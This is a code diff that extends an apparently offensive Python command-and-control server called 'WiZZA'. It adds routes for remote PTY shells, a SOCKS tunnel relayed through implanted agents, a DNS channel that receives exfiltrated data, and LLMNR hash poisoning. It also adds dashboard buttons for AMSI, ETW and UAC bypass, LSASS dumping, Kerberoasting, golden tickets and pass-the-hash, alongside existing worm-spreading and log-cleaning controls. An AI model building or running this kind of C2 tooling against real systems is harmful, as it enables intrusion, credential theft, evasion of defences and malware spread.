@@ -6,6 +6,51 @@ from datetime import datetime
 from collections import defaultdict
 from urllib.parse import urlparse,parse_qs,unquote_plus
 
+# ── Optional module imports ───────────────────────────────────────────────────
+_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
+_MOD_DIR  = os.path.join(_THIS_DIR, "..", "modules")
+import sys as _sys
+if _MOD_DIR not in _sys.path: _sys.path.insert(0, _MOD_DIR)
+
+try:
+    from proxy_socks import start_proxy, stop_proxy, list_sessions
+    from proxy_socks import agent_poll_proxy, agent_connected, agent_data_from, agent_data_to, agent_close
+    _PROXY_OK = True
+except ImportError:
+    _PROXY_OK = False
+
+try:
+    import pty_handler as _pty
+    _PTY_OK = True
+except ImportError:
+    # pty_handler is in the same directory
+    try:
+        _sys.path.insert(0, _THIS_DIR)
+        import pty_handler as _pty
+        _PTY_OK = True
+    except ImportError:
+        _PTY_OK = False
+
+try:
+    from dns_c2 import c2_store_cmd as _dns_store_cmd, c2_get_cmd_txt as _dns_get_txt
+    from dns_c2 import c2_receive_chunk as _dns_recv_chunk
+    _DNS_C2_OK = True
+except ImportError:
+    _DNS_C2_OK = False
+
+try:
+    from c2_profiles import set_profile as _set_profile, list_profiles as _list_profiles
+    from c2_profiles import get_profile as _get_profile
+    _PROFILES_OK = True
+except ImportError:
+    _PROFILES_OK = False
+
+try:
+    from llmnr_poison import start as _llmnr_start, stop as _llmnr_stop, get_hashes as _llmnr_hashes
+    _LLMNR_OK = True
+except ImportError:
+    _LLMNR_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -100,6 +145,7 @@ def _strip_ansi(s): return _re.sub(r'\x1b\[[0-9;]*[A-Za-z]|\r','',s)
 def log(m):
     l=f"[{ts()}] {m}"; print(l,flush=True)
     open(f"{LOG_DIR}/c2.log","a").write(_strip_ansi(l)+"\n")
+_log = log  # alias used by some route handlers
 
 # ── TCP raw agent listener ───────────────────────────────────────────────────
 def handle_agent(conn,addr):
@@ -541,6 +587,8 @@ a{{color:var(--acc);text-decoration:none}}
 <a class="nav" onclick="T('loot')" id="n-loot">&#x1F4E6; Loot <span class="badge" id="b-lc">{lc}</span></a>
 <a class="nav" onclick="T('wf')" id="n-wf">&#x1F9EC; Worm Family <span class="badge p" id="b-wc">{wc}</span></a>
 <a class="nav" onclick="T('wctl')" id="n-wctl">&#x2699; Worm Control</a>
+<a class="nav" href="/netmap" target="_blank">&#x1F5FA; Net Map</a>
+<a class="nav" href="/report" target="_blank">&#x1F4CB; Report</a>
 <div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
 </div>
 <div id="main">
@@ -580,6 +628,33 @@ a{{color:var(--acc);text-decoration:none}}
 <a class="qa y" onclick="Q('NET_MOUNTS')">NET_MOUNTS</a><a class="qa y" onclick="Q('GIT_POISON')">GIT_POISON</a>
 <a class="qa y" onclick="Q('EMAIL_SPREAD')">EMAIL_SPREAD</a><a class="qa y" onclick="Q('DOCKER_ESCAPE')">DOCKER_ESCAPE</a>
 <a class="qa y" onclick="Q('SPREAD')">USB_SPREAD</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">EDR / Evasion</div><div class="qa-row">
+<a class="qa p" onclick="Q('AMSI_BYPASS')">AMSI</a>
+<a class="qa p" onclick="Q('ETW_BYPASS')">ETW</a>
+<a class="qa p" onclick="Q('NTDLL_UNHOOK')">UNHOOK</a>
+<a class="qa p" onclick="Q('UAC_BYPASS')">UAC</a>
+<a class="qa p" onclick="Q('IMPERSONATE_SYSTEM')">IMPERSONATE</a>
+<a class="qa p" onclick="Q('LSASS_DUMP')">LSASS</a>
+<a class="qa p" onclick="Q('WMI_PERSIST')">WMI PERSIST</a>
+<a class="qa p" onclick="Q('COM_HIJACK')">COM HIJACK</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Active Directory</div><div class="qa-row">
+<a class="qa y" onclick="Q('AD_ENUM')">AD ENUM</a>
+<a class="qa y" onclick="Q('KERBEROAST')">KERBEROAST</a>
+<a class="qa y" onclick="Q('AS_REP_ROAST')">AS-REP ROAST</a>
+<a class="qa y" onclick="Q('DCE_ENUM')">DCE ENUM</a>
+<a class="qa y" onclick="Q('BLOODHOUND')">BLOODHOUND</a>
+<a class="qa y" onclick="Q('PASS_THE_HASH')">PTH</a>
+<a class="qa y" onclick="Q('PASS_THE_TICKET')">PTT</a>
+<a class="qa y" onclick="Q('GOLDEN_TICKET')">GOLDEN TICKET</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Shell / Tunnel</div><div class="qa-row">
+<a class="qa g" onclick="window.open('/pty/'+_aid+'/term','_blank','width=1000,height=600')">&#x1F5A5; PTY SHELL</a>
+<a class="qa g" onclick="Q('PTY_START')">PTY START</a>
+<a class="qa" onclick="Q('PROXY_START')">PROXY START</a>
+<a class="qa" onclick="Q('PROXY_STOP')">PROXY STOP</a>
+<a class="qa" onclick="Q('PORT_FWD')">PORT FWD</a>
 </div></div>
 <div class="qa-sec"><div class="qa-lbl">Danger</div><div class="qa-row">
 <a class="qa r" onclick="Q('CLEAN')">CLEAN LOGS</a>
@@ -974,6 +1049,163 @@ class H(BaseHTTPRequestHandler):
                     }
             self._json(ledger); return
 
+        # ── Network map (visual) ───────────────────────────────────────────────
+        if path == "/netmap":
+            nm = os.path.join(_THIS_DIR, "static", "netmap.html")
+            if os.path.exists(nm):
+                self._html(open(nm).read())
+            else:
+                self._html("<h2>netmap.html not found</h2>")
+            return
+
+        # ── Report generation ──────────────────────────────────────────────────
+        if path.startswith("/report"):
+            fmt = qs.get("fmt",["html"])[0]
+            try:
+                _sys.path.insert(0, _MOD_DIR)
+                from report_gen import generate_report
+                html_out = generate_report(
+                    agents, dict(agent_resps),
+                    loot_dir=LOOT_DIR, creds_file=CREDS_FILE,
+                    fmt=fmt,
+                    title="WiZZA Pentest Report",
+                    engagement=qs.get("eng",[""])[0],
+                    operator=qs.get("op",[""])[0],
+                )
+                if fmt == "json":
+                    self._json(json.loads(html_out)); return
+                if fmt == "csv":
+                    self._send(html_out, "text/csv"); return
+                self._html(html_out)
+            except Exception as e:
+                self._html(f"<h2>Report error: {e}</h2>")
+            return
+
+        # ── Agents JSON (network map) ──────────────────────────────────────────
+        if path == "/agents/json":
+            with _lock:
+                snap = {aid: {k:v for k,v in a.items() if k != "log"}
+                        for aid, a in agents.items()}
+            self._json(snap); return
+
+        # ── C2 Profiles ────────────────────────────────────────────────────────
+        if path == "/profiles":
+            if _PROFILES_OK:
+                self._json({"profiles": _list_profiles(),
+                            "active":   _get_profile().get("user_agent","?")[:60]})
+            else:
+                self._json({"error": "c2_profiles module not available"})
+            return
+
+        if path.startswith("/profiles/set/"):
+            pname = path.split("/")[-1]
+            if _PROFILES_OK:
+                self._json({"result": _set_profile(pname)})
+            else:
+                self._json({"error": "c2_profiles module not available"})
+            return
+
+        # ── LLMNR/NBT-NS poisoner endpoints ───────────────────────────────────
+        if path == "/llmnr/start":
+            if _LLMNR_OK:
+                attacker_ip = qs.get("ip",[""])[0]
+                result = _llmnr_start(attacker_ip) if attacker_ip else _llmnr_start()
+                log(f"[LLMNR] started: {result[:60]}")
+                self._json({"result": result})
+            else:
+                self._json({"error": "llmnr_poison module not available"})
+            return
+
+        if path == "/llmnr/stop":
+            if _LLMNR_OK:
+                result = _llmnr_stop()
+                log(f"[LLMNR] {result}")
+                self._json({"result": result})
+            else:
+                self._json({"error": "llmnr_poison module not available"})
+            return
+
+        if path == "/llmnr/hashes":
+            if _LLMNR_OK:
+                self._send(_llmnr_hashes(), "text/plain")
+            else:
+                self._send("llmnr_poison module not available")
+            return
+
+        # ── PTY shell ─────────────────────────────────────────────────────────
+        if path.startswith("/pty/"):
+            parts = path.split("/")  # ['','pty','aid',...]
+            pty_aid = parts[2] if len(parts) > 2 else qs.get("aid",[""])[0]
+            sub = parts[3] if len(parts) > 3 else ""
+
+            if not _PTY_OK:
+                self._html("<h2>pty_handler module not available</h2>"); return
+
+            if not sub or sub == "term":
+                self._html(_pty.pty_html(pty_aid)); return
+
+            if sub == "stream":
+                # SSE endpoint — streams PTY output to browser/xterm.js
+                self.send_response(200)
+                self.send_header("Content-Type", "text/event-stream")
+                self.send_header("Cache-Control", "no-cache")
+                self.send_header("Connection", "keep-alive")
+                self._cors(); self.end_headers()
+                try:
+                    for chunk in _pty.stream_output(pty_aid):
+                        data = chunk.encode() if isinstance(chunk, str) else chunk
+                        self.wfile.write(data)
+                        self.wfile.flush()
+                except Exception:
+                    pass
+                return
+            return
+
+        # ── SOCKS5 proxy tunnel (agent-side polling) ──────────────────────────
+        if path.startswith("/proxy/"):
+            if not _PROXY_OK:
+                self._json({"error": "proxy_socks module not available"}); return
+            parts = path.split("/")  # ['','proxy','aid','action']
+            p_aid    = parts[2] if len(parts) > 2 else ""
+            p_action = parts[3] if len(parts) > 3 else ""
+
+            if p_action == "poll":
+                # Agent polls: returns next pending connection task {conn_id, host, port}
+                task = agent_poll_proxy(p_aid)
+                self._json(task or {}); return
+
+            if p_action == "sessions":
+                self._json(list_sessions(p_aid)); return
+
+            self._json({}); return
+
+        # ── DNS C2 TXT records (for DoH forwarding) ───────────────────────────
+        if path == "/dns":
+            if not _DNS_C2_OK:
+                self._json({"error": "dns_c2 module not available"}); return
+            # ?name=poll.<aid>.domain&type=TXT  — poll for commands
+            # ?name=<seq>-<total>-<aid>.<data>.<domain>&type=TXT  — receive exfil
+            name = qs.get("name",[""])[0]
+            parts = name.split(".")
+            if name.startswith("poll.") and len(parts) >= 2:
+                aid_short = parts[1]
+                self._json({"Answer": [{"type": 16, "data": f'"{_dns_get_txt(aid_short)}"'}]})
+            elif len(parts) >= 3:
+                try:
+                    meta = parts[0].split("-")  # seq-total-aid_short
+                    seq  = int(meta[0]); total = int(meta[1])
+                    aid_short = meta[2] if len(meta) > 2 else "anon"
+                    chunk = parts[1]
+                    result = _dns_recv_chunk(seq, total, aid_short, chunk)
+                    if result:
+                        log(f"[DNS-C2] exfil from {aid_short}: {result[:80]}")
+                except Exception:
+                    pass
+                self._json({"Status": 0})
+            else:
+                self._json({"Status": 0})
+            return
+
         # Agent delete
         if path=="/agent/delete":
             aid=qs.get("aid",[""])[0]
@@ -1125,6 +1357,75 @@ class H(BaseHTTPRequestHandler):
                     agents.setdefault(aid,{})["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             except Exception: pass
             self._send(_comm_enc("OK", aid) if aid else "OK"); return
+
+        # ── PTY input / kill (POST from xterm.js) ────────────────────────────
+        if p.path.startswith("/pty/"):
+            if _PTY_OK:
+                parts = p.path.split("/")  # ['','pty','aid','action']
+                pty_aid = parts[2] if len(parts) > 2 else ""
+                sub = parts[3] if len(parts) > 3 else ""
+                if sub == "input":
+                    data_str = b.decode(errors="replace")
+                    _pty.put_input(pty_aid, data_str)
+                    self._send("OK"); return
+                if sub == "start":
+                    try: d = json.loads(b.decode(errors="replace")); shell = d.get("shell","")
+                    except: shell = ""
+                    msg = _pty.start_pty(pty_aid, shell or None)
+                    self._send(msg); return
+                if sub == "stop":
+                    _pty.stop_pty(pty_aid)
+                    self._send("OK"); return
+                if sub == "output":
+                    # Agent POSTs PTY output chunk to C2
+                    chunk = b.decode(errors="replace")
+                    _pty.put_output(pty_aid, chunk)
+                    # Return any pending input for agent
+                    inp = _pty.get_input(pty_aid)
+                    self._send(inp or ""); return
+            self._send("OK"); return
+
+        # ── SOCKS5 proxy relay (agent POSTs data) ─────────────────────────────
+        if p.path.startswith("/proxy/"):
+            if _PROXY_OK:
+                parts = p.path.split("/")
+                p_aid    = parts[2] if len(parts) > 2 else ""
+                p_action = parts[3] if len(parts) > 3 else ""
+                conn_id  = qs.get("cid",[""])[0]
+                if p_action == "connected":
+                    agent_connected(p_aid, conn_id, True)
+                    self._send("OK"); return
+                if p_action == "data":
+                    # Agent sends data received from target back to SOCKS client
+                    agent_data_from(p_aid, conn_id, b)
+                    # Return any data operator wants to send to target
+                    to_send = agent_data_to(p_aid, conn_id)
+                    if to_send:
+                        self.send_response(200)
+                        self.send_header("Content-Type","application/octet-stream")
+                        self.send_header("Content-Length",len(to_send))
+                        self._cors(); self.end_headers()
+                        self.wfile.write(to_send)
+                    else:
+                        self._send(""); return
+                    return
+                if p_action == "close":
+                    agent_close(p_aid, conn_id)
+                    self._send("OK"); return
+            self._send("OK"); return
+
+        # ── Store DNS C2 command (operator → DNS channel) ─────────────────────
+        if p.path == "/dns/cmd":
+            if _DNS_C2_OK:
+                try:
+                    d = json.loads(b.decode(errors="replace"))
+                    _dns_store_cmd(d.get("aid",""), d.get("cmd",""))
+                    self._json({"ok": True})
+                except Exception as e:
+                    self._json({"error": str(e)})
+            else:
+                self._json({"error": "dns_c2 not available"})
+            return
 
         if p.path=="/catch":
             try:
